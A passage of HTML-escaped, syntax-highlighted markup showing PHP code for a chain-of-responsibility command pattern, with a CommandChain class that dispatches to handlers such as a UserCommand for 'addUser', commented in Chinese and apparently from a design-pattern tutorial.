style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;onCommand(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$name&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$args&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;); &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;} &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;class&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;CommandChain{&amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;private&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$_commands&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;array&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;();&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:green;&quot;&gt;//&amp;nbsp;命令处理程序数组&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;public&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;addCommand(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$cmd&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;){&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:green;&quot;&gt;//&amp;nbsp;添加命令处理程序&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;-&amp;gt;_commands[]&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$cmd&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;; &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;} &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;public&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;runCommand(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$name&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$args&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;){&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:green;&quot;&gt;//&amp;nbsp;执行命令&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;foreach&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$this&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;-&amp;gt;_commands&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;as&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$cmd&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;){&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:green;&quot;&gt;//&amp;nbsp;遍历命令处理程序&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$cmd&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;-&amp;gt;onCommand(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$name&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$args&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:green;&quot;&gt;//&amp;nbsp;如果程序处理成功就退出循环&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;} &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;} &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;} &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;class&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;UserCommand&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;implements&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;ICommand{&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;comment&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:green;&quot;&gt;//&amp;nbsp;命令处理类1&amp;nbsp;&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;public&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;onCommand(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$name&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$args&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;){ &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;if&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#dd0000;&quot;&gt;$name&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;!=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;&quot;&gt;''addUser''&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;keyword&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;false; &amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li class=&quot;alt&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;background-image:initial;background-attachment:initial;background-origin:initial;background-clip:initial;background-color:#ffffff;background-position:initial initial;background-repeat:initial initial;&quot;&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:#000000;&quot;&gt;(&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;color:blue;&quot;&gt;&quot;UserCommand&amp;nbsp;handling&amp;nbsp;''addUser''\\n&quot;&lt;/span&gt;&lt;span 